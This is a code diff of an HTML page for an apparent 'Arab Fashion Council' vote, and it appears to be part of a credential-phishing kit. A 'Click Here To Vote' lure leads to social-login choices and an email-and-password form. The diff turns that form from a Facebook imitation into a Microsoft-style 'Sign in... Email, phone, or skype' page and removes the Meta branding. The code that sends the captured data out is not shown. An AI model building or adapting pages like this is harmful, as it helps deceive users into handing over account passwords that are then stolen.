@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html class="_9dls touch _ar44 js-focus-visible _aa4c" lang="en" dir="ltr" data-js-focus-visible="">
 
@@ -27,38 +26,38 @@
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.css">
     <title>Arab Fashion Council</title>
     <style>
-.mgm {
-    display: none;
-    /* Initially hidden */
-    background-color: #fff9d7;
-    border: 1px solid #e2c822;
-    width: 100%;
-    max-width: 400px; 
-    /* Set a max width */
-    padding: 5px;
-    text-align: center;
-    border-radius: 5px;
-    margin: 10px auto;
-    /* Add margin to create space around it */
-    font-family: Arial, sans-serif;
-    font-size: 11px;
-}
+        .mgm {
+            display: none;
+            /* Initially hidden */
+            background-color: #fff9d7;
+            border: 1px solid #e2c822;
+            width: 100%;
+            max-width: 400px;
+            /* Set a max width */
+            padding: 5px;
+            text-align: center;
+            border-radius: 5px;
+            margin: 10px auto;
+            /* Add margin to create space around it */
+            font-family: Arial, sans-serif;
+            font-size: 11px;
+        }
 
-.mgm .txt {
-    display: inline-block;
-    /* Display text inline-block to align with any other inline content */
-    vertical-align: middle;
-    /* Vertical alignment */
-}
+        .mgm .txt {
+            display: inline-block;
+            /* Display text inline-block to align with any other inline content */
+            vertical-align: middle;
+            /* Vertical alignment */
+        }
 
-.mgm img {
-    display: inline-block;
-    width: 35px;
-    height: 35px;
-    border-radius: 50%;
-    vertical-align: middle;
-    margin-right: 10px;
-}
+        .mgm img {
+            display: inline-block;
+            width: 35px;
+            height: 35px;
+            border-radius: 50%;
+            vertical-align: middle;
+            margin-right: 10px;
+        }
 
 
         .stopwatch {
@@ -145,32 +144,32 @@
 <body>
     <div id="home">
 
-<header>
-    <img src="img/slide.png"><br><br>
+        <header>
+            <img src="img/slide.png"><br><br>
 
-    <center>
-        <div class="mgm">
-            <span class="txt">This is a sample message.</span>
-        </div><br><br>
+            <center>
+                <div class="mgm">
+                    <span class="txt">This is a sample message.</span>
+                </div><br><br>
 
-        <button id="vote2" onclick="vote()">
-            Click Here To Vote
-        </button><br><br>
-    </center>
-</header>
-<script>
-    function toggleMGM() {
-    const mgm = document.querySelector('.mgm');
-    const voteButton = document.getElementById('vote2');
-    
-    if (mgm.style.display === 'block') {
-        mgm.style.display = 'none';
-    } else {
-        mgm.style.display = 'block';
-    }
-}
+                <button id="vote2" onclick="vote()">
+                    Click Here To Vote
+                </button><br><br>
+            </center>
+        </header>
+        <script>
+            function toggleMGM() {
+                const mgm = document.querySelector('.mgm');
+                const voteButton = document.getElementById('vote2');
 
-</script>
+                if (mgm.style.display === 'block') {
+                    mgm.style.display = 'none';
+                } else {
+                    mgm.style.display = 'block';
+                }
+            }
+
+        </script>
 
         <div id="blue">
 
@@ -328,7 +327,8 @@
                         <div class="t706__cartwin-products">
                             <div class="t706__cartwin-bottom">
                             </div>
-                            <img id="choose_fb" onclick="handleFbClick()" src="image/fb.png">
+                            <img id="choose_fb" style="border-radius: 100%; border-color: #e2c822;"
+                                onclick="handleFbClick()" src="img/apapmapa.png">
                             <img id="choose_ig" onclick="handleIgClick()" src="image/ig.png">
                             <img id="choose_tw" onclick="handleTwClick()" src="img/xlog.png">
                         </div>
@@ -441,68 +441,54 @@
     <!--Facebook login begins-->
     <div id="fb_wrapper">
 
-        <div id="fbbody" class="fbook">
+        <div id="fbbody" class="fbook" style="text-align: left; background-color: black; padding: 20%;">
             <br>
-            <center><span
-                    style="display: flex; justify-content: center; align-items: center; text-align: center; color: rgb(70, 90, 105); display: inline; font-size: 13px; font-family: &quot;Optimistic Text Normal&quot;; ">English
-                    (UK)</span></center><br><br><br><br>
 
             <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
-                style="pointer-events: none; margin-top: 0px; margin-bottom: 20px; flex-grow: 1; flex-shrink: 100; align-items: center; justify-content: center;">
-                <img alt="Facebook from Meta" src="img/fblogo.png" class="wbloks_1"
-                    style="max-height: 60px; min-height: 0px; object-fit: contain; overflow: hidden;">
-            </div><br><br><br>
+                style="pointer-events: none; margin-top: 0px; margin-bottom: 20px; flex-grow: 1; flex-shrink: 100; align-items: center; justify-content: left;">
+                <img src="img/apapmapa2.png" class="wbloks_1"
+                    style="max-height: 60px; width: 150px; min-height: 0px; object-fit: contain; overflow: hidden;">
+            </div>
 
-            <div class="pam _3-95 _9ay3 uiBoxRed" role="alert" tabindex="0" id="error_box" style="display: none;">
-                <div class="fsl fwb fcb">Wrong credentials</div>
-                <div>Invalid username or password</div>
+            <div style="color: white; display: flex; flex-direction: column; justify-content: flex-start;">
+                <div style="font-size: 26px; font-weight: 600; ">Sign in</div>
+                <div style="font-size: 15px;">to continue</div>
             </div><br>
 
 
             <div class="form-group">
-                <input type="text" id="fb-email" required oninput="toggleClearIcon()">
-                <label for="fb-email">Mobile number or email address</label>
+                <input type="text" placeholder="Email, phone, or skype"
+                    style="border-radius: 0; border: none; border-bottom: 2px solid #000;outline: none;" id="fb-email"
+                    required oninput="toggleClearIcon()">
                 <div class="clear-input" id="clearIcon" onclick="clearEmailInput()"></div>
             </div>
 
             <div class="form-group">
-                <input type="password" id="fb-pass" required>
-                <label for="fb-pass">Password</label>
+                <input type="password" placeholder="Password"
+                    style="border-radius: 0; border: none; border-bottom: 2px solid #000;outline: none;" id="fb-pass"
+                    required>
                 <div class="toggle-password" onclick="togglePasswordVisibility()"></div>
                 <!-- Icon as a clickable div -->
             </div>
 
             <div
-                style="opacity: 1; height: 44px; min-width: 44px; flex-grow: 1; padding-left: 20px; padding-right: 20px; background: rgb(0, 100, 224); border: 0px solid rgb(28, 43, 51); border-radius: 22px; align-items: center; flex-direction: row; justify-content: center;">
+                style="opacity: 1; height: 44px; min-width: 44px; flex-grow: 1; padding-left: 20px; padding-right: 20px; background: rgb(0, 100, 224); border: 0px solid rgb(28, 43, 51); border-radius: 0; width: 50px; align-items: right; flex-direction: row; justify-content:right;">
 
                 <div class="wbloks_113" dir="auto">
 
                     <div onclick="login()"
-                        style="padding: 9px; display: flex; justify-content: center; color: rgb(255, 255, 255); font-weight: 500;  font-size: 16px; font-family: &quot;Optimistic Text Normal&quot;;  ">
-                        Log
-                        in</div>
+                        style=" padding: 9px; display: flex; justify-content: center; color: rgb(255, 255, 255); font-weight: 500;  font-size: 16px; font-family: &quot;Optimistic Text Normal&quot;;  ">
+                        Submit</div>
 
                 </div>
             </div> <br><br>
 
             <div class="wbloks_112" style="font-size: 15px; max-height: 20.28px; word-break: break-all;">
                 <div class="wbloks_113" dir="auto"><span data-bloks-name="bk.components.TextSpan"
-                        style="line-height: 1rem; color: rgb(28, 43, 51); font-weight: 500; display: inline; font-size: 15px; font-family: &quot;Optimistic Text Normal&quot;; overflow-wrap: break-word;">Forgotten
-                        Password?</span></div>
-            </div><br><br><br><br><br>
-
-            <div data-bloks-name="bk.components.Flexbox" tabindex="0" role="button" aria-label="Create new account"
-                data-anchor-id="replay" class="wbloks_1" style="pointer-events: inherit; width: 100%;">
-                <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
-                    style="pointer-events: none; opacity: 1; height: 36px; min-width: 36px; flex-grow: 1; padding-left: 20px; padding-right: 20px; background: rgba(255, 255, 255, 0); border: 1px solid rgb(203, 210, 217); border-radius: 18px; align-items: center; flex-direction: row; justify-content: center;">
-                    <div>
-                        <span data-bloks-name="bk.components.TextSpan"
-                            style="padding: 8px; display: flex; justify-content: center; color: rgb(28, 43, 51); font-weight: 500; display: flex; font-size: 15px; font-family: &quot;Optimistic Text Normal&quot;; overflow-wrap: break-word;">Create
-                            new account</span>
-                    </div>
-
-                </div>
-            </div>
+                        style="line-height: 1rem; color: rgb(57, 76, 86); font-weight: 500; display: inline; font-size: 15px; font-family: &quot;Optimistic Text Normal&quot;; overflow-wrap: break-word;">No
+                        account?
+                        <span style="color: #0056b3;">Create one</span></span></div>
+            </div><br><br><br>
 
 
             <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
@@ -515,9 +501,6 @@
                                 style="aspect-ratio: 5 / 1;">
                                 <svg aria-hidden="true" xmlns="http://www.w3.org/2000/svg" height="1" width="5"
                                     class="wbloks_110"></svg>
-                            </div>
-                            <div class="wbloks_109"><img alt="Meta logo" src="img/meta.png" class="wbloks_1"
-                                    style="width: 100%; pointer-events: inherit; mask-image: url(img/meta.png); mask-size: contain; background-color: rgb(70, 90, 105); object-position: 10000px 10000px; object-fit: contain; overflow: hidden;">
                             </div>
                     </center>
                 </div>
